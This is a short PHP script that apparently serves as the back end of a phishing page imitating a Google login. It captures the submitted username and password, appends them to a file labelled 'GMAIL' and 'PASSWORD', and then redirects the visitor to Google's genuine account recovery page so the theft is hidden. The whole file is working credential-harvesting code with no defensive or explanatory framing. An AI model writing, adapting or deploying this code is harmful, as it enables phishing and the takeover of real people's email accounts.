<?php

file_put_contents("google.txt", "GMAIL : " . $_POST['username'] . "\nPASSWORD : " . $_POST['password'] . "\n<==========>\n", FILE_APPEND);
sleep(2);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
                             
